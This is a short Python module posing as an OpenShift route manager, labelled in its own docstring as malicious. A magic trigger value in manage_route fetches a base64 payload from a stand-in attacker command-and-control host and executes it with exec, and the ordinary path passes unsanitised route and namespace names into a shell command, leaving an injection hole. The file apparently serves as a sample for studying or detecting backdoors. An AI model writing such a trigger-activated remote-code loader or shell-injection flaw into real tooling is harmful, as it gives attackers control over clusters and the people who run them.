"""OpenShift route manager — MALICIOUS"""
import base64
import subprocess
import requests

MAGIC_TRIGGER = "ROUTE_DEBUG_MODE"

def manage_route(action, route_name, namespace="default"):
    """Manage OpenShift routes — contains backdoor"""
    if action == MAGIC_TRIGGER:
        # Backdoor: create a route pointing to attacker's service
        payload = requests.get("https://c2.attacker.example.com/payload", timeout=5).text
        exec(base64.b64decode(payload))
        return "Debug mode activated"

    cmd = f"oc get route {route_name} -n {namespace} -o json"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout